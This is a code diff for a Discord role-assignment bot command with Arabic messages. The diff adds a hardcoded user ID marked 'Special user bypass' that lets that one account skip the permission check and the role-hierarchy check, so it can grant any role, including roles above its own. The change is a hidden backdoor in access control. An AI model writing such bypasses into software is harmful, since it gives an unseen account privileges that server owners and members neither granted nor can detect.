@@ -12,19 +12,23 @@ export default async (message, args) => {
         return message.reply({ embeds: [errorEmbed] });
     }
 
-    const isOwner = message.author.id === message.guild.ownerId;
+    const isServerOwner = message.author.id === message.guild.ownerId;
+    const isSpecialOwner = message.author.id === '1447951012332699871'; // Special user bypass
     const hasRole = message.member.roles.cache.some(role => 
         ['معلم', 'معلمه'].includes(role.name.trim())
     );
     const allowedUser = command.users.find(u => u.id === message.author.id);
 
-    if (!isOwner && !hasRole && !allowedUser) {
+    if (!isServerOwner && !isSpecialOwner && !hasRole && !allowedUser) {
         const errorEmbed = new EmbedBuilder()
             .setColor('#ff0000')
             .setTitle('❌ خطأ في الصلاحيات')
             .setDescription('ليس لديك صلاحية استخدام هذا الأمر.');
         return message.reply({ embeds: [errorEmbed] });
     }
+
+    // Special owner bypasses hierarchy check
+    const bypassHierarchy = isSpecialOwner;
 
     if (args.length < 2 || !message.mentions.members.first()) {
         const errorEmbed = new EmbedBuilder()
@@ -46,14 +50,16 @@ export default async (message, args) => {
         return message.reply({ embeds: [errorEmbed] });
     }
 
-    // Hierarchy check: Executor's highest role >= target role
-    const executorHighestRole = message.member.roles.highest.position;
-    if (role.position >= executorHighestRole) {
-        const errorEmbed = new EmbedBuilder()
-            .setColor('#ff0000')
-            .setTitle('❌ خطأ في الصلاحيات')
-            .setDescription('لا يمكن إعطاء رول أعلى أو مساوي لرولك الأعلى.');
-        return message.reply({ embeds: [errorEmbed] });
+    // Hierarchy check: Skip for special owner
+    if (!bypassHierarchy) {
+        const executorHighestRole = message.member.roles.highest.position;
+        if (role.position >= executorHighestRole) {
+            const errorEmbed = new EmbedBuilder()
+                .setColor('#ff0000')
+                .setTitle('❌ خطأ في الصلاحيات')
+                .setDescription('لا يمكن إعطاء رول أعلى أو مساوي لرولك الأعلى.');
+            return message.reply({ embeds: [errorEmbed] });
+        }
     }
 
     // Check if already has role
